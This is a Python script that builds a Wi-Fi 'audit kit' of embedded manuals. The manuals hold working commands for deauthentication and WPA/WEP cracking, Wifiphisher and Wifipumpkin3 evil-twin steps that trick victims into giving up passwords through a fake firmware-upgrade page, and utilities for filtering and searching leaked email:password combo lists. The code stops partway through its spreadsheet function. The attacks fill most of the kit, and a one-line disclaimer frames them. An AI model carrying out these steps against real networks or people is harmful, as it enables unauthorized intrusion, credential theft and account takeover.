#!/usr/bin/env python3
"""
WiFi Audit Kit v4.1 - Consolidated

Flat structure + single disclaimer + full preservation of every original
tested code snippet from the source files. Generates:
  - README.md (one disclaimer only)
  - MASTER_CHECKLIST.md
  - AIRCRACK_MANUAL.md          (exact original content)
  - WORDLIST_UTILS.md           (exact original + COMBO)
  - SUPPLEMENTAL.md             (exact Wifiphisher + WiFi-Pumpkin3)
  - TOOLS_RESOURCES.md
  - ADAPTER_SETUP.md            (exact Alfa steps)
  - KISMET.md                   (exact original)
  - WIFI_AUDIT_TRACKER.xlsx
  - captures/  hashcat/  wordlists/

Usage:
  python3 wifi_audit_kit.py --name "My-Audit-2026-07-17"
  python3 wifi_audit_kit.py --name "ClientX" --force
"""

from __future__ import annotations
import argparse
import sys
from datetime import datetime
from pathlib import Path
from textwrap import dedent

try:
    from openpyxl import Workbook
    from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
    from openpyxl.utils import get_column_letter
    from openpyxl.worksheet.datavalidation import DataValidation
    HAS_OPENPYXL = True
except ImportError:
    HAS_OPENPYXL = False

APP_VERSION = "4.1 (Flat Structure + Exact Original Snippets)"
LOG_OK = " [+] "
LOG_WARN = " [!] "
LOG_SUB = "   |-- "

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="WiFi Audit Kit v4.1 - Consolidated")
    p.add_argument("--name", dest="name", default=None,
                   help="Engagement folder name (required for automation).")
    p.add_argument("--force", action="store_true",
                   help="Recreate if directory exists.")
    p.add_argument("--no-spreadsheet", action="store_true",
                   help="Skip .xlsx generation.")
    return p.parse_args()

def resolve_name(cli_name: str | None) -> Path:
    if cli_name:
        return Path(cli_name.strip())
    default = datetime.now().strftime("%Y-%m-%d_WIFI_AUDIT")
    print(f"{LOG_WARN}No --name given. Defaulting to: {default}")
    return Path(default)

def create_structure(base: Path, force: bool) -> None:
    if base.exists():
        if force:
            import shutil
            print(f"{LOG_WARN}--force: removing {base}")
            shutil.rmtree(base)
        else:
            print(f"{LOG_WARN}Directory '{base}' exists. Use --force.")
            sys.exit(1)
    base.mkdir(parents=True, exist_ok=False)
    print(f"{LOG_OK}Created: {base}")
    for d in ("captures", "hashcat/sessions", "hashcat/rules", "wordlists/combo"):
        (base / d).mkdir(parents=True, exist_ok=True)
        print(f"{LOG_SUB}{d}/")

# ---------------------------------------------------------------------------
# EXACT ORIGINAL CONTENT (never modified)
# ---------------------------------------------------------------------------

def get_aircrack_manual_exact() -> str:
    # Exact content of wifi_assessment_manual.txt (all commands unchanged)
    return dedent("""\
=====================================================
WIFI ASSESSMENT MANUAL: AIRCRACK-NG SUITE GUIDE
=====================================================

This manual outlines the steps for capturing and cracking WPA/WPA2 Handshakes,
plus older WEP cracking techniques, using the aircrack-ng suite. Refer to the
official Newbie Guide for full context: https://www.aircrack-ng.org/doku.php?id=newbie_guide

-----------------------------------------------------
STEP 1: PREPARATION AND INTERFACE SETUP (airmon-ng)
-----------------------------------------------------

# 1.1 Kill interfering processes (Crucial!)
# Stops processes like NetworkManager that can interfere with monitor mode.
# Command:
sudo airmon-ng check kill

# 1.2 Start Monitor Mode
# Replaces 'wlan0' with your actual wireless interface name.
# Command:
sudo airmon-ng start wlan0
# Output will show the new monitor interface name (e.g., wlan0mon).

# 1.3 List available interfaces to confirm new monitor mode interface
# Command:
iw dev

# 1.4 Disable Power Saving on the Monitor Interface (Recommended)
# USB adapters can drop into a low-power sleep state, which causes missed
# packets and unreliable injection during long captures or repeated deauth
# attempts. The modern command below is preferred over the legacy
# 'iwconfig wlan0mon power off', which still works but is outdated.
# Command:
sudo iw dev wlan0mon set power_save off
# Check the current power-save status at any time with:
iw dev wlan0mon get power_save

-----------------------------------------------------
STEP 2: PASSIVE RECONNAISSANCE (airodump-ng)
-----------------------------------------------------

# 2.1 Discover Networks in the Area
# Lists all Access Points (APs), channels, and BSSIDs within range.
# Command:
sudo airodump-ng wlan0mon

# 2.2 Understanding "<length: 0>" Entries
# In dense environments (apartment buildings especially) it's common to see
# what looks like more than half the entries in the list as "hidden"
# networks. In most cases these are NOT hidden Access Points at all -- they
# are client devices (phones, laptops, IoT gear) sending probe requests for
# networks they've connected to before.
#   - A phone constantly asks: "Hey, is [network I connected to before] around?"
#   - airodump-ng logs that probe as "<length: 0>" until it also observes a
#     matching beacon frame from an actual Access Point.
# This produces a lot of list noise that looks like hidden APs but is really
# just devices searching for networks, not the networks themselves.

# 2.3 Filter to Access Points With Active Clients
# The -a flag restricts the AP list to Access Points that currently have at
# least one associated client, which removes most of the probe-request noise
# described above.
# Command:
sudo airodump-ng -a wlan0mon

# 2.4 Reading Signal Strength (PWR)
# The PWR column reports signal strength in dBm; values closer to 0 are
# stronger.
#   PWR (dBm)        Strength
#   -20 to -40        Excellent -- very close to the AP
#   -40 to -50        Very strong
#   -50 to -60        Good / usable
#   -60 to -70        Moderate -- may see some packet loss
#   -70 to -80        Weak -- degraded throughput
#   -80 to -90        Very weak -- often unstable
#   -90 and below     Barely detectable / at the noise floor
# A weak PWR reading is one of the most common reasons a capture attempt
# fails -- see Step 7 for guidance on improving signal quality.

# 2.5 Target a Specific Network and Capture
# Run this command in a NEW terminal window and let it run.
# -c [channel]: Specifies the channel of the target AP.
# --bssid [MAC]: Filters for the BSSID (MAC address) of the target AP.
# -w [filename]: Specifies the prefix for the capture file (e.g., 'target_ap').
# Command (Example):
sudo airodump-ng -c 11 --bssid 00:01:02:03:04:05 -w dump wlan0mon
# **What it does:** Focuses the monitor interface on channel 11, captures all packets
# for BSSID 00:01:02:03:04:05, and saves them to a file starting with 'dump'.

-----------------------------------------------------
STEP 3: WPA/WPA2 HANDSHAKE CAPTURE (aireplay-ng)
-----------------------------------------------------

# To capture the 4-way handshake, a client must (re)connect to the AP.
# Deauthentication attacks (Deauth) force a client to disconnect and reconnect.

# 3.1 Check for PMF (Protected Management Frames / 802.11w) First
# PMF encrypts and authenticates management frames, including deauth frames.
# If PMF is required on the target network, a classic deauth attack will not
# work, and effort is better spent on a passive capture instead. Easiest way
# to check, using Wireshark:
#   1. Open Wireshark as root on the monitor interface:
#      sudo wireshark
#   2. Select wlan0mon and start capturing.
#   3. Apply the display filter (replace with the target network's BSSID):
#      wlan.fc.type_subtype == 0x08 && wlan.bssid == AA:BB:CC:DD:EE:FF
#   4. Double-click a Beacon frame from the target network.
#   5. Navigate to: 802.11 Wireless LAN -> Tagged parameters -> RSN Information
#      -> RSN Capabilities, and check these two fields:
#        Management Frame Protection Required = 1  -> PMF required;
#                                                       deauth will usually fail.
#        Management Frame Protection Capable  = 1  -> PMF optional;
#                                                       deauth will often still work.
#        Both fields 0 or missing                  -> PMF disabled; deauth will work.

# 3.2 Perform a Deauth Attack (in a separate terminal)
# Correct syntax: the packet count goes directly after -0, NOT after -a.
#   aireplay-ng -0 <count> -a <AP_BSSID> [-c <client_MAC>] wlan0mon
# -0 5: Sends 5 deauthentication packets. Use a small number initially.
# -a [AP_BSSID]: MAC address of the Access Point (target).
# -c [Client_MAC]: MAC address of a connected client (optional, but targeted).
# Command (Example with Client):
sudo aireplay-ng -0 5 -a 00:01:02:03:04:05 -c 00:06:07:08:09:0A wlan0mon
# **What it does:** Sends deauth packets to the specific client to force a
# re-authentication. Look for the 'WPA Handshake:' notification in the
# airodump-ng window.
#
# Deauth count guidance:
#   -0 3   Sends 3 deauth packets    Best starting point
#   -0 5   Sends 5 deauth packets    Very good
#   -0 0   Continuous deauth         Fast but noisy; avoid unless necessary
# Sending more than 5-10 deauth packets per burst is usually overkill and
# mainly increases the chance of detection.

# 3.3 Handshake Capture Best Practices
#   - Channel discipline: stay locked on the target AP's channel (Step 2.5)
#     for the entire capture -- the handshake only occurs on the AP's
#     operating channel, so channel-hopping will miss it.
#   - Prefer a targeted deauth (-c <client_MAC>) over a broadcast deauth;
#     many modern clients ignore broadcast deauth frames outright.
#   - If the handshake doesn't appear within 10-20 seconds, repeat Step 3.2
#     rather than escalating the packet count.
# Recommended workflow:
#   sudo airodump-ng wlan0mon
#   sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
#   sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c XX:XX:XX:XX:XX:XX wlan0mon

-----------------------------------------------------
STEP 4: WEP CRACKING: ARP REPLAY ATTACK (aireplay-ng)
-----------------------------------------------------

# WEP is vulnerable to attacks that inject packets to generate lots of IVs (Initialization Vectors) quickly.

# 4.1 Perform Fake Authentication (Optional, but often needed)
# -1 0: Fake authentication (type 1), 0 seconds delay.
# -e [ESSID]: The name of the AP.
# -a [AP_BSSID]: MAC address of the AP.
# -h [Attacker_MAC]: Your card's MAC address (after monitor mode).
# Command (Example):
sudo aireplay-ng -1 0 -e Target_AP_Name -a 00:01:02:03:04:05 -h 00:0B:C0:FF:EE:DD wlan0mon
# **What it does:** Attempts to associate with the AP to prepare for injection.

# 4.2 Perform ARP Replay Attack
# -3: Specifies the ARP Replay Attack.
# -b [AP_BSSID]: MAC address of the AP.
# Command (Example):
sudo aireplay-ng -3 -b 00:01:02:03:04:05 wlan0mon
# **What it does:** Injects captured ARP packets back into the network to generate
# a high volume of new data (IVs) for cracking. Monitor the **Data** column in airodump-ng.

-----------------------------------------------------
STEP 5: CRACKING THE CAPTURE FILE (aircrack-ng)
-----------------------------------------------------

# 5.1 Check the Capture File for Handshake/IVs
# The capture file will be named like 'dump-01.cap'.
# Command (Example):
aircrack-ng dump-01.cap
# **What it does:** Reads the packet capture file and displays the handshake count (WPA) or **IVs** count (WEP).

# 5.2 Cracking WPA/WPA2 with Aircrack-ng (Dictionary Attack)
# Requires a successful handshake (1 handshake).
# -a 2: Specifies WPA/WPA2 cracking mode.
# -b [AP_BSSID]: MAC address of the target AP.
# -w [wordlist]: Path to your wordlist file.
# Command (Example):
aircrack-ng -a 2 -b 00:01:02:03:04:05 -w /path/to/wordlist.txt dump-01.cap
# See WORDLIST_UTILS.txt for guidance on why wordlist *strategy* (rules,
# masks, hybrid attacks) usually matters more than wordlist size alone.

# 5.3 Cracking WEP (Requires sufficient IVs)
# Does not require -a 1, as WEP cracking is the default mode.
# Command (Example):
aircrack-ng dump-01.cap
# **What it does:** Automatically attempts to crack the WEP key once enough IVs (usually >10,000) are captured.

-----------------------------------------------------
STEP 6: CLEANUP
-----------------------------------------------------

# 6.1 Stop Monitor Mode and Restore Network Services
# Command:
sudo airmon-ng stop wlan0mon

# 6.2 Restart NetworkManager
# Required to restore normal Wi-Fi connectivity.
# Command:
sudo service NetworkManager restart

-----------------------------------------------------
STEP 7: CAPTURE OPTIMIZATION AND TROUBLESHOOTING
-----------------------------------------------------

# 7.1 Regulatory Domain and Channel Access
# Setting the correct regulatory domain unlocks additional 5 GHz channels and
# higher transmit power limits for your adapter. This is frequently
# overlooked.
# Command (replace US with your own country code, e.g., DE, GB, JP):
sudo iw reg set US
# Some 5 GHz channels are DFS (Dynamic Frequency Selection) channels; the
# card may skip or restrict them if the regulatory domain is set incorrectly.
# Restart airmon-ng (or bring the interface down/up) after changing this.

# 7.2 Driver and Hardware Notes (ALFA AWUS036ACM Example)
#   - Use a USB 3.0+ port where possible for stable power delivery.
#   - Prefer the in-kernel driver for your chipset over older out-of-tree
#     builds when one is available for your kernel version.
#   - Antenna position and a short, high-quality USB extension cable can
#     meaningfully improve reception in weak-signal situations.

# 7.3 Better Scanning and Targeting
#   - airodump-ng -M shows manufacturer names, which helps identify device
#     types (phone, IoT, laptop) in the client list.
#   - airodump-ng --wps flags networks with WPS enabled.
#   - Run two airodump-ng instances: one broad scan to find targets, and one
#     locked to the specific BSSID + channel (Step 2.5) for a clean capture.

# 7.4 Environmental Factors
#   - Range is shorter on 5 GHz than 2.4 GHz; physical proximity to the AP
#     has an outsized effect on capture reliability.
#   - Nearby Bluetooth devices, microwaves, and other 2.4/5 GHz transmitters
#     add interference -- disable what you can during a test.
#   - Walls, metal objects, and the human body can noticeably attenuate a
#     5 GHz signal.

# 7.5 Common Mistakes That Reduce Success Rate
#   - Skipping 'airmon-ng check kill' before starting (Step 1.1).
#   - Running airodump-ng without locking the channel (Step 2.5).
#   - Using unnecessarily high deauth counts (30+).
#   - Attempting a capture on a weak signal (PWR -70 or worse, Step 2.4)
#     instead of moving closer first.
#   - Not allowing enough time after a deauth burst -- some clients take
#     5-15 seconds to reconnect.
#   - Forgetting that PMF (Step 3.1) blocks classic deauth entirely on
#     properly configured WPA2/WPA3 networks.

# 7.6 Documentation for Academic / Research Write-Ups
#   - Record the adapter model, driver, regulatory domain, and every command
#     run, along with observed signal strength (Step 2.4).
#   - Note whether the capture was active (deauth-assisted) or fully
#     passive, and explain why that method was chosen for the scenario.
#   - Where relevant, discuss how PMF and WPA3 adoption are reducing the
#     effectiveness of traditional deauth-based handshake capture over time.

-----------------------------------------------------
ADAPTER SETUP: ALFA AWUS036ACM (DETAILED STEPS)
-----------------------------------------------------

# Complete setup process for Alfa AWUS036ACM adapter on Kali Linux

sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y
sudo reboot now

# After reboot, continue:
sudo apt update
sudo apt install realtek-rtl88xxau-dkms
sudo apt install dkms
git clone https://github.com/aircrack-ng/rtl8812au
cd rtl8812au/
make
sudo make install
lsusb
iwconfig

# Verify the adapter is recognized and can enter monitor mode.
# For power-management and regulatory-domain tuning after setup, see Step 7.
""").strip()

def get_wordlist_utils_exact() -> str:
    # Exact content from wordlist_utils.txt + COMBO.md commands (unmodified)
    return dedent("""\
///////////////// WORDLIST AND COMBO CLEANUP UTILITIES //////////////////////

These commands are essential for managing, cleaning, and preparing large wordlists
for efficient password cracking.

# 1. Check Number of Lines in a Wordlist
wc -l example.txt

# 2. Join Multiple Wordlist/Combo Files into One
# Run this inside the directory containing the files.
cat *.txt > new_combined.txt

# 3. Remove Duplicates from a List (Sorts and removes simultaneously)
cat example.txt | sort | uniq > unique_list.txt

# 4. Extract Only Passwords or Emails from a Combo List (e.g., email:password)
# -d':': Use ':' as the delimiter (separator).
# -f2: Selects the second field (password). Use -f1 to select the first (email).
cat example.txt | cut -d':' -f2 > passwords_only.txt

# 5. Wordlist Strategy: Why Bigger Isn't Always Better
# Generic public wordlists (SecLists, rockyou-style lists, etc.) see
# diminishing returns against longer, higher-entropy modern passwords. In
# practice, the following techniques tend to outperform simply using a
# larger dictionary:
#
#   Technique          Description                              Tooling
#   Rule-based attack  Apply mutation rules to a smaller list    hashcat rules
#   Mask attack        Brute-force a known pattern,              hashcat
#                      e.g. ?u?l?l?l?d?d?d?d
#   Hybrid attack      Wordlist + mask combined                  hashcat
#   Prince attack      Combines words from a list in smart ways  princeprocessor
#
# Custom/targeted wordlists (e.g. built with a tool like cupp) can also
# outperform large generic lists, but should only ever be built from
# information already in scope for an authorized engagement, such as
# organization-specific naming conventions the client has provided. Building
# a wordlist from personal details gathered about an individual without
# their consent falls outside authorized security testing and is not
# covered by this kit.

////////////////////////////////////////////////////////////////////////////////

## Clean up combos in Kali :

**Show number of lines in a txt file or combo list you are working with :**

``` wc -l example.txt ```

**Unzip a file in terminal :**

``` tar xvzf ‘filename you are unzipping’ ```

**Remove Lines Containing a Specific String:**

```sed -e '/.fr/d' -e '/.uk/d' -e '/.ru/d' -e '/.FR/d' -e '/.UK/d' -e '/.RU/d' /home/kali/Documents/dirty_combo.txt > clean_combo.txt```

Additions:

```-e '/.ne/d' -e '/.jp/d' -e '/.ocn/d' -e '/.ne/d' -e '/.ac/d' -e '/@alice/d' -e '/.it/d' -e '/.br/d'```

***

**Join multiple “combo .txt” files into one big one too work with :**


(After you ‘cd’ over the the folder(or directory) that all the .txt combos are in, you enter the following command)

``` cat *.txt > new.txt ```  (The ‘*’ is joining all .txt files ; and the ‘> new.txt’ is naming this new file you are creating)

**Remove the seperators in the combo list to have them all match… (Ex. of separators… “: or ;”)** 

``` sed ‘s/;/:/g’ example.txt > new_example.txt ``` (We are looking for ” ; ” in the list and changing them all to match ” : ” …. ” > ” saves to the name you choose for this new .txt file)

**Remove the extra spaces between lines in a text file:**

```tr -s '\\n' < input.txt > output.txt```

**Sort combo list to easily see duplicates :**

``` cat example.txt | sort > new_example.txt ```

**Remove duplicates from a combo list :**

( command used, sorts list and removes duplicates at the same time… )

``` cat example.txt | sort | uniq > new_example.txt ```

**Mix combo list and save in a new file:**

```shuf combo_list.txt > mixed_combo_list.txt```

**Keep just the password or email and remove the other from list :**

``` cat example.txt | cut -d’ : ‘ -f2 > new_example.txt ``` ( after ” -d’ : ‘ “you must decide to delete before or after the semicolon …… ” -f2 ” deletes just the email leaving you with a list of passwords) – (” -f1 ” deletes all the passwords leaving you with emails)

**Search for specific email in a folder of txt combos using “zipgrep” :**

(After you ‘cd’ over the the folder(or directory) that all the .txt combos are in, you enter the following command)

``` zgrep -a “example @ mail.com\`” *.txt` ``` (Terminal will display which file the email is saved in)

**How to search for multiple emails at the same time :**

``` zgrep -e “example @ mail.com” -e “example2 @ mail.com” -e “example3 @ mail.com” *.txt ```

{ You can also split one giant combo list into multiple smaller txt files, choosing however many lines per split you want }


***

## Clean up Combos with Sublime:

Press F5 or click Edit -> Sort Lines

***

### 10-28-2024





Correct Command:
Bash
sed 's/|.*[[:space:]]*$//' input.txt > output.txt
Explanation:
sed: Stream editor for filtering and transforming text.
s/|.*[[:space:]]*$//:
s: Substitute command.
|.*: Match from the first | character to the end of the line.
[[:space:]]*: Match zero or more trailing spaces.
$: Ensure matching until the end of the line.
//: Replace with nothing (delete).
input.txt: Input file.
> output.txt: Redirect output to a new file.
Why this command?
The original command (sed 's/|.*//') would leave a space at the end of each line if there were trailing spaces after the | character. By adding [[:space:]]*$ to the pattern:
[[:space:]]* matches zero or more spaces.
$ anchors the match to the end of the line.
This ensures that any trailing spaces are removed, resulting in lines with no spaces at the end.

Click Edit -> Permute Lines -> Unique.

In my experience, CSV/JSON data file has duplicates very often (especially leaked files). And it’s worth remembering to run this function before working with any table.
""").strip()

def get_supplemental_exact() -> str:
    # Exact content from WIFIPHISHER.md + WIFIPUMPKIN3.md (commands unmodified)
    return dedent("""\
# MORE RECOURCES TO READ - - (Remove or keep this?)

* Known Beacons Powerpoint (Keywork: "wifi automatic association attack") - https://census-labs.com/media/known_beacons_34c3.pdf

* ettercap tutorial - https://charlesreid1.com/wiki/MITM/Evil_Twin_with_Ettercap


### Personal Notes:

* Evil Twin attack against an open network:
ALL clients will automatically connect to the rogue_AP
This is a typical attack against captive portals

Q: Wifiphisher successfully detected 2.4G hz wifi but not 5G hz - Is 5G hz supported?

A: No it does not. However, i would say that the point is moot since you still need a better frequency range than the target's and there's no better candidate than 2.4Ghz for that.

Q: Why is no one clicking on my Rogue AP? - Why some victim users do not automatically connect to the rogue Access Point?

A: I think you haven't understand the internals of the tool.
There are many reasons why victims would not connect to the rogue AP: https://wifiphisher.readthedocs.io/en/latest/faq.html#why-some-victim-users-do-not-automatically-connect-to-the-rogue-access-point
We rely on Evil Twin (cloning the target network) if the target network is of Open type or the PSK is known to us. I wouldn't recommend cloning a password-protected network and waiting for the user to manually connect (even though it may happen in extreme cases). Mount other kind of attacks, such as KARMA and Known Beacons that will make victims automatically associate with the rogue AP. Wifiphisher supports much more than the "Evil Twin".

Victim’s Network Manager. Different Operating Systems support different wireless features. For example, an Android device will, by default, connect automatically to previously connected open networks making it susceptible to the Known Beacons Wi-Fi automatic association attack. At the same time iOS devices are configured to arbitrarily trasmit probe request frames for previously connected networks making them vulnerable to the KARMA attack.

* Wifiphisher Powerpoint: https://census-labs.com/media/bsideslondon15-wifiphisher.pdf

* Known-Beacon Attck: https://census-labs.com/news/2018/02/01/known-beacons-attack-34c3/


* * *

### "Wifiphisher" Tutorial: (https://github.com/wifiphisher/wifiphisher) - [https://github.com/wifiphisher/extra-phishing-pages]

* WifiPhisher is a popular tool to execute Evil Twin Attacks on a Targets Wireless AP (The tool is capable of using modern Wi-Fi association methods such as Known Beacons, KARMA, and Evil Twin)

	Overview :

	The idea here is to create an evil twin AP, then de-authenticate or DoS the user from their real AP. When they re-authenticate to your fake AP with the same SSID, they will see a legitimate-looking webpage that requests their password because of a "firmware upgrade." When they provide their password, you capture it and then allow them to use the evil twin as their AP, so they don't suspect a thing

	Steps:

	1. De-auth user from there AP
	2. Allow user to authenticate to your evil twin 
	3. Offer a webpage to the user on a proxy that notifies them that a "firmware upgrade" has taken place, and that they need to authenticate again.  
	4. User will manually enter there password and it will be passed onto you

	*****************************************************

	Wifiphisher can be run with or without any parameters or options. To run the tool without setting any parameters, simply type wifiphisher or python bin/wifiphisher in the terminal.
	The tool searches for the corresponding Wi-Fi interface and opens in GUI mode.
	Once the GUI is open, the tool searches for available Wi-Fi networks (ESSID) in the vicinity. The target ESSID can be selected using the up / down arrow keys.

	*****************************************************

	First step, is to INSTALL the script -
	
	apt-get update

	apt install wifiphisher

	On the first time running it will likely tell you that "hostapd" is not found and will prompt you to install it. Install by typing "y" for yes. It will then proceed to install hostapd (Run again after install)

	Next, the script will start the web server on port 8080 and 443, then go about and discover the available Wi-Fi networks

	When it has completed, it will list all the Wi-Fi networks it has discovered

	Go ahead and hit Ctrl + C on your keyboard and you will be prompted for the number of the AP that you would like to attack ( you will enetr the number of the ap on the list - 1, 2, 3, or 4 etc.)

	When you hit Enter, Wifiphisher will display a screen like the one below that indicates the interface being used and the SSID of the AP being attacked and cloned

	The target user has been de-authenticated from their AP. When they re-authenticate, they will directed to the the cloned evil twin access point

	When they do, the proxy on the web server will catch their request and serve up an authentic-looking message that a firmware upgrade has taken place on their router and they must re-authenticate

	If the user is fooled the will enter there credentials and hit submit

	When the user enters their password, it will be passed to you through the Wifiphisher open terminal

	The user will be passed through to the web through your system and out to the Internet, never suspecting anything awry has happened


### Wifipumpkin3 Installation and Setup:

Before we can use this tool, we need to install the dependent packages for this to work use the following command to do that.

``` 
sudo apt-get update 
apt install libssl-dev libffi-dev build-essential
```

Now that we have installed the dependencies, we need to download the tool from GitHub and change the directory to the wifipumpkin3 and install the python dependency.

```
git clone https://github.com/P0cL4bs/wifipumpkin3.git  
cd wifipumpkin3
apt install python3-pyqt5
apt install hostapd                                                    
python3 -c "from PyQt5.QtCore import QSettings; print('done')"
```

As we are done with that we would like to install the setup file which came with wifipumpkin3, this python file will install all the other dependencies that this tool will need to function properly.

```python3 setup.py install```

Now that we have installed all the tools perfectly let’s use wifipumpkin, the first thing we would do today is to create a fake AP with whatever name you want, with this access point we would wait for a victim to connect to the network and also do a MITM attack to sniffing packets. we will try to sniff out the post request that may contain users’ credentials like email and password, this would only work with HTTP. Let’s go in to see how this works.

WP3 Setup:

    Command      Description
    -------      -----------
    ap           show all variable and status from AP
    clients      show all connected clients on AP


```
wifipumpkin3
set interface wlan0
set ssid Free Wifi
set proxy noproxy
ignore pydns_server
start
```

After starting the Fake access point, we can see that some protocols have also been started these will help in the capturing of sensitive information which is passed over the network
From our second device, we will find the SSID for bogus AP, when the victim connects to this he will receive malicious IP from our DHCP server.

From our second device, we could go to an HTTP page that doesn’t have SSL (secured socket layer ) with this whatever information like email, username, or password entered we would be able to view the text entered by the victim.

Wifipumkin captures the traffic and the credentials which were entered by the victim
""").strip()

def get_kismet_exact() -> str:
    # Exact content of KISMET.md
    return dedent("""\
KISMET Setup:

### Installing gpsd on Linux:

First you want to install gpsd which will be managing our gps:

``` sudo apt-get install gpsd ```

``` sudo apt-get install gpsd-clients ```

---------- First thing you


After plugging in a GPS / GNSS receiver through the USB port, your GPS should be automatically configured. To verify, type the below command:

``` ls /dev/tty* ```

To further verify if the GPS has been bound to this folder type:

This will display the GPS input stream

``` cat /dev/ttyACM0 ```

### Setup wireless adadpter with airmon-ng:

``` sudo airmon-ng start wlan0 ```

``` sudo airmon-ng check kill ```

### Stop the systemd gpsd services:

``` systemcyl stop gpsd ```
``` systemctl stop gpsd.socket ```

["  Stopping gpsd.service, but it can still be activated by: gpsd.socket  "]




### View XGPS Display:

Type:

``` xgps ```





* * *


### Kismet Conversion:

Export contents of various tables in kismet DB to csv file:

``` kkismetdb_to_wiglecsv -i /home/kali/Kismet-20220808-06-41-29-1.kismet -o new.csv ```

Help Page:

```
Kismetdb to WigleCSV

A simple tool for converting the packet data from a KismetDB log file to
the CSV format used by Wigle

usage: kismetdb_to_wiglecsv [OPTION]
 -i, --in [filename]          Input kismetdb file
 -o, --out [filename]         Output Wigle CSV file
 -f, --force                  Force writing to the target file, even if it exists.
 -r, --rate-limit [rate]      Limit updated records to one update per [rate] seconds
                              per device
 -c, --cache-limit [limit]    Maximum number of device to cache, defaults to 1000.
 -v, --verbose                Verbose output
 -s, --skip-clean             Don't clean (sql vacuum) input database
 -e, --exclude lat,lon,dist   Exclude records within 'dist' *meters* of the lat,lon
                              provided.  This can be used to exclude packets close to
                              your home, or other sensitive locations.

```
""").strip()

def get_adapter_exact() -> str:
    # Exact Alfa steps as they appear across the source files
    return dedent("""\
Setup Alfa AWUS036ACM Adapter (steps):

sudo apt update 
sudo apt upgrade -y 
sudo apt dist-upgrade -y 
sudo reboot now 
sudo apt update 
sudo apt install realtek-rtl88xxau-dkms 
sudo apt install dkms 
git clone https://github.com/aircrack-ng/rtl8812au 
cd rtl8812au/ 
make 
sudo make install 
lsusb 
iwconfig
""").strip()

def get_master_checklist() -> str:
    return dedent("""\
# MASTER CHECKLIST (single file)

## Prep
[ ] airmon-ng check kill
[ ] airmon-ng start wlan0
[ ] iw dev wlan0mon set power_save off
[ ] iw reg set <CC>
[ ] Document adapter / driver

## Recon
[ ] airodump-ng -a wlan0mon
[ ] Record BSSID / channel / PWR / clients
[ ] Wireshark PMF check (RSN Capabilities)

## Capture
[ ] airodump-ng -c <ch> --bssid <BSSID> -w capture captures/
[ ] aireplay-ng -0 3 -a <AP> -c <client> wlan0mon
[ ] Confirm "WPA handshake" or PMKID
[ ] Move .cap into captures/

## Verify + Convert
[ ] aircrack-ng capture-01.cap
[ ] hcxpcapngtool -o handshake.hc22000 --all --pmkid capture-01.cap   (preferred)
[ ] Place .hc22000 into hashcat/

## Hashcat (custom rules)
[ ] hashcat -m 22000 -a 0 -w 3 --session audit1 handshake.hc22000 wordlist.txt -r oneruletorulethemall.rule --outfile cracked.txt
[ ] Log rule + wordlist + result in TRACKER.xlsx
[ ] Resume with: hashcat --session audit1 --restore

## Cleanup
[ ] airmon-ng stop wlan0mon
[ ] service NetworkManager restart
[ ] Update TRACKER.xlsx fully
""").strip()

def get_readme() -> str:
    return dedent(f"""\
# WiFi Audit Kit v{APP_VERSION}

**Disclaimer:** This kit is for educational purposes and authorized testing only. Always obtain explicit permission before testing any network.

## Structure (flat)

```
<Name>/
├── README.md
├── MASTER_CHECKLIST.md
├── AIRCRACK_MANUAL.md          # exact original aircrack-ng guide
├── WORDLIST_UTILS.md           # exact original utils + COMBO commands
├── SUPPLEMENTAL.md             # exact Wifiphisher + WiFi-Pumpkin3
├── ADAPTER_SETUP.md            # exact Alfa AWUS036ACM steps
├── KISMET.md                   # exact original
├── TOOLS_RESOURCES.md
├── WIFI_AUDIT_TRACKER.xlsx
├── captures/                   # drop .cap / .pcap here
├── hashcat/                    # .hc22000, sessions/, rules/
└── wordlists/                  # custom lists + combo/
```

## Workflow

1. Fill Engagement + Targets sheets in WIFI_AUDIT_TRACKER.xlsx
2. Follow MASTER_CHECKLIST.md (all phases in one place)
3. Use AIRCRACK_MANUAL.md for the exact tested aircrack-ng commands
4. Convert with hcxtools, crack with hashcat + your custom rule (oneruletorulethemall.rule etc.)
5. Log every session in the Cracking sheet

All original command blocks from the source files are preserved verbatim in the reference files above.
""").strip()

def get_tools() -> str:
    return dedent("""\
=====================================================
TOOLS & RESOURCES
=====================================================

Core: aircrack-ng suite, hashcat, hcxtools, Wireshark/tshark
Evil Twin: Wifiphisher, WiFi-Pumpkin3
Wordlists: SecLists, Kaonashi, targeted generation
Modern capture alternative: hcxdumptool + hcxpcapngtool
PMF check: Wireshark Beacon RSN Capabilities
""").strip()

def create_spreadsheet(base: Path) -> None:
    if not HAS_OPENPYXL:
        print(f"{LOG_WARN}openpyxl missing → pip install openpyxl")
        return
    wb = Workbook()
    header_fill = PatternFill("solid", fgColor="1F4E79")
    header_font = Font(bold=True, color="FFFFFF")
    thin = Border(left=Side(style="thin"), right=Side(style="thin"),
                  top=Side(style="thin"), bottom=Side(style="thin"))

    def style_header(ws):
        for cell in ws[1]:
            cell.fill = header_fill
            cell.font = header_font
            cell.alignment = Alignment(horizontal="center", wrap_text=True)
            cell.border = thin

    def auto_w(ws):
        for col in ws.columns:
            letter = get_column_letter(col[0].column)
            maxlen = max((len(str(c.value or "")) for c in col), default=10)
            ws.column_dimensions[letter].width = min(maxlen + 2, 40)

    # Instructions
    ws = wb.active
    ws.title = "Instructions"
    ws["A1"] = "WiFi Audit Tracker – fill Engagement first, then Targets → Captures → Cracking → Findings"
    ws.merge_cells("A1:F1")
    ws["A3"] = "All original aircrack-ng / hashcat / wordlist commands live in the flat .md files in the engagement root."

    # Engagement
    ws1 = wb.create_sheet("Engagement")
    for col, h in enumerate(["Field", "Value", "Notes"], 1):
        ws1.cell(1, col, h)
    style_header(ws1)
    for i, (f, v) in enumerate([
        ("Client / Name", ""),
        ("Auditor", ""),
        ("Date", datetime.now().strftime("%Y-%m-%d")),
        ("Adapter", "Alfa AWUS036ACM"),
        ("Custom Rule", "oneruletorulethemall.rule"),
        ("Authorization", "Confirmed"),
    ], 2):
        ws1.cell(i, 1, f)
        ws1.cell(i, 2, v)
    auto_w(ws1)

    # Targets
    ws2 = wb.create_sheet("Targets")
    headers = ["BSSID", "ESSID", "Channel", "PWR", "Clients", "PMF", "Capture Status", "Handshake Type", "Notes"]
    for col, h in enumerate(headers, 1):
        ws2.cell(1, col, h)
    style_header(ws2)
